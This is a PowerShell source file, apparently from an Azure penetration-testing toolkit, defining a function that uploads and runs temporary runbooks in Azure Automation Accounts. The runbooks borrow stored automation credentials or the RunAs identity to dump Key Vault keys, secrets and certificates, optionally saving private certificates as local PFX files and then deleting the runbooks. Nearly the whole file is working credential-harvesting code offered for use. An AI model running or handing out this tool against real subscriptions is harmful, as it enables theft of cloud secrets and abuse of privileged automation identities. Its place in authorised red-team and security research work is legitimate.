<#
    File: Get-AzureKeyVaults-Automation.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2019
    Description: PowerShell function for dumping Azure Key Vault Keys and Secrets via Automation Accounts.
#>


# Check if the AzureRM Module is installed and imported
if(!(Get-Module AzureRM)){
    try{Import-Module AzureRM -ErrorAction Stop}
    catch{Install-Module -Name AzureRM -Confirm}
    }

# Check if the Azure Module is installed and imported
if(!(Get-Module Azure)){
    try{Import-Module Azure -ErrorAction Stop}
    catch{Install-Module -Name Azure -Confirm}
    }


Function Get-AzureKeyVaults-Automation
{
<#
    .SYNOPSIS
        Dumps all available Key Vault Keys/Secrets from an Azure subscription via Automation Accounts. Pipe to Out-Gridview, ft -AutoSize, or Export-CSV for easier parsing.
    .DESCRIPTION
        This function will look for any Key Vault Keys/Secrets that are available to an Automation RunAs Account, or as a configured Automation credential. 
        If either account has Key Vault permissions, the runbook will read the values directly out of the Key Vaults.
        A runbook will be spun up, so it will create a log entry in the automation jobs.
        Per the statements above, and the fact that you may try to access keys that you may not have permissions for... This should not be considered as Opsec Safe.
    .PARAMETER Subscription
        Subscription to use.
    .PARAMETER CertificatePassword
        Password to use for the exported PFX files
    .PARAMETER ExportCerts
        Flag for saving private certs locally.
    .EXAMPLE
        PS C:\MicroBurst> Get-AzureKeyVaults-Automation -Verbose 
        VERBOSE: Logged In as kfosaaen@notasubscription.onmicrosoft.com
        VERBOSE: Getting List of Azure Automation Accounts...
        VERBOSE: 	Automation Credential (testcred) found for kfosaaen Automation Account
        VERBOSE: 	Automation Credential (testCred2) found for kfosaaen Automation Account
        VERBOSE: 	Getting getting available Key Vault Keys/Secrets using the kfosaaen Automation Account, testcred Credential, and the FCIGmKqaTkEUViN.ps1 Runbook
        VERBOSE: 		Waiting for the automation job to complete
        VERBOSE: 		Removing FCIGmKqaTkEUViN runbook from kfosaaen Automation Account
        VERBOSE: 	Getting getting available Key Vault Keys/Secrets using the kfosaaen Automation Account, testCred2 Credential, and the HzROkCvceonUNdh.ps1 Runbook
        VERBOSE: 		Waiting for the automation job to complete
        VERBOSE: 		Removing HzROkCvceonUNdh runbook from kfosaaen Automation Account
        VERBOSE: Automation Key Vault Dumping Activities Have Completed
        

    .LINK
        https://blog.netspi.com/azure-automation-accounts-key-stores
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription to use.")]
        [string]$Subscription = "",
        
        [parameter(Mandatory=$false,
        HelpMessage="Password to use for exporting the Automation certificates.")]
        [String]$CertificatePassword = "TotallyNotaHardcodedPassword...",

        [Parameter(Mandatory=$false,
        HelpMessage="Export the Key Vault certificates to local files.")]
        [ValidateSet("Y","N")]
        [string]$ExportCerts = "N"

    )

    # Check to see if we're logged in
    $LoginStatus = Get-AzureRmContext
    $accountName = $LoginStatus.Account
    if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
        try {Login-AzureRmAccount -ErrorAction Stop}
        catch{Write-Warning "Login process failed."}
        }
    else{}

    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzureRmSubscription"
    if ($Subscription){        
        Select-AzureRmSubscription -SubscriptionName $Subscription | Out-Null
    }
    else{
        # List subscriptions, pipe out to gridview selection
        $Subscriptions = Get-AzureRmSubscription -WarningAction SilentlyContinue
        $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
        foreach ($sub in $subChoice) {Get-AzureKeyVaults-Automation -Subscription $sub -ExportCerts $ExportCerts -CertificatePassword $CertificatePassword}
        break
    }

    Write-Verbose "Logged In as $accountName"

    # Create data table to house results
    $TempTblCreds = New-Object System.Data.DataTable 
    $null = $TempTblCreds.Columns.Add("Vault")
    $null = $TempTblCreds.Columns.Add("Key/Secret")
    $null = $TempTblCreds.Columns.Add("Type")
    $null = $TempTblCreds.Columns.Add("Name")
    $null = $TempTblCreds.Columns.Add("Value")
    
    # Get a list of Automation Accounts
    Write-Verbose "Getting List of Azure Automation Accounts..."
    $AutoAccounts = Get-AzureRmAutomationAccount | out-gridview -Title "Select One or More Automation Accounts" -PassThru    
    foreach ($AutoAccount in $AutoAccounts){
        # Set name of Automation Account
        $verboseName = $AutoAccount.AutomationAccountName

        $jobList = @()

        # If the runbook doesn't exist, don't run it
        if (Test-Path $PSScriptRoot\Misc\KeyVaultRunBook.ps1 -PathType Leaf){
                
            $autoCredName = (Get-AzureRmAutomationCredential -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $verboseName).Name

            # Overwrite the TEMPLATECREDENTIAL in the runbook
            if($autoCredName){
                foreach ($credEntry in $autoCredName){
                    Write-Verbose "`tAutomation Credential ($credEntry) found for $verboseName Automation Account"
                    # Set Random names for the runbooks. Prevents conflict issues
                    $jobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})

                    ((Get-Content -path $PSScriptRoot\Misc\KeyVaultRunBook.ps1 -Raw) -replace 'TEMPLATECREDENTIAL',$credEntry)|Out-File $pwd\$jobName.ps1
                    $jobList += @($jobName+" "+$credEntry)
                }
            }
            else{            
                # Set Random names for the runbooks. Prevents conflict issues
                $jobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})

                # Copy KeyVaultRunBook.ps1 to $pwd\$jobName.ps1
                Copy-Item $PSScriptRoot\Misc\KeyVaultRunBook.ps1 -Destination $pwd\$jobName.ps1 | Out-Null
                $jobList += @($jobName)
            }

            # For each job in job list, run the runbook

            foreach ($jobToRun in $jobList){
                $jobToRunName = $jobToRun.split(" ")[0]
                $jobToRunCredential = $jobToRun.split(" ")[1]
                if($jobToRunCredential -eq $null){$jobToRunCredential = "RunAs"}

                Write-Verbose "`tGetting getting available Key Vault Keys/Secrets using the $verboseName Automation Account, $jobToRunCredential Credential, and the $jobToRunName.ps1 Runbook"
                try{
                    # Import the Runbook
                    Import-AzureRmAutomationRunbook -Path $pwd\$jobToRunName.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobToRunName | Out-Null

                    # Publish the Runbook
                    Publish-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobToRunName | Out-Null

                    # Run the Runbook and get the job id
                    $jobID = Start-AzureRmAutomationRunbook -Name $jobToRunName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId

                    $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status

                    # Wait for the job to complete
                    Write-Verbose "`t`tWaiting for the automation job to complete"
                    while($jobstatus.Status -ne "Completed"){
                        $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
                    }    

                    # If there was actual data here, get the output and add it to the table                    
                    try{
                        # Get the output
                        $jobOutput = Get-AzureRmAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzureRmAutomationJobOutputRecord | Select-Object -ExpandProperty Value

                        if ($jobOutput.Values -ne $null){
                            # Write Keys/Secrets to the table
                            $lines = ($jobOutput.Values).split("`n")

                            Foreach($line in $lines){
                                $splitValues = ($line).split("`t")
                            
                                # If export type is Cert, and ExportCerts flag is set, write the file locally
                                if (($ExportCerts -eq 'Y') -and ($splitValues[2] -eq "application/x-pkcs12")){
                                    $vaultKey = $splitValues[3]
                                    $FileName = Join-Path $pwd $vaultKey"-ExportedCertificate.pfx"
                                    Write-Verbose "`t`tWriting Certificate to $FileName"
                                    [IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String($splitValues[4]))
                                
                                    # Also add the cert to the table
                                    $null = $TempTblCreds.Rows.Add($splitValues[0],$splitValues[1],$splitValues[2],$splitValues[3],$splitValues[4])
                                }
                                else{
                                    # Add the Keys/Secrets to the table
                                    $null = $TempTblCreds.Rows.Add($splitValues[0],$splitValues[1],$splitValues[2],$splitValues[3],$splitValues[4])
                                }
                            }
                        }
                        else{Write-Verbose "`tNo Keys/Secrets to return from the $verboseName Automation Account"}
                    }
                    catch {}

                    # Clean up
                    Write-Verbose "`t`tRemoving $jobToRunName runbook from $verboseName Automation Account"
                    Remove-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobToRunName -ResourceGroupName $AutoAccount.ResourceGroupName -Force
                }
                Catch{Write-Verbose "`tUser does not have permissions to import Runbook"}

                # Delete the temp Runbook
                Remove-Item $pwd\$jobToRunName.ps1 | Out-Null
            }
        }
        # Option to redownload the ps1 to the directory from GitHub
        else{
            Write-Warning "KeyVaultRunBook.ps1 is not in the $PSScriptRoot\Misc directory, did you delete the file?"
            $promptResponse = "Y"
            $promptResponse = (Read-Host "Would you like to download the KeyVaultRunBook.ps1 runbook from Github? [Y/n]")
            If (($promptResponse -eq "Y") -or ($promptResponse -eq "y")){
                If(Test-Path $PSScriptRoot\Misc){Invoke-WebRequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/master/Misc/KeyVaultRunBook.ps1" -OutFile $PSScriptRoot\Misc\KeyVaultRunBook.ps1}
                else{
                    New-Item -Path $PSScriptRoot -Name "Misc" -ItemType "Directory"
                    Invoke-WebRequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/master/Misc/KeyVaultRunBook.ps1" -OutFile $PSScriptRoot\Misc\KeyVaultRunBook.ps1
                }
            }
        }
    }

    Write-Verbose "Automation Key Vault Dumping Activities Have Completed"
    Write-Output $TempTblCreds
}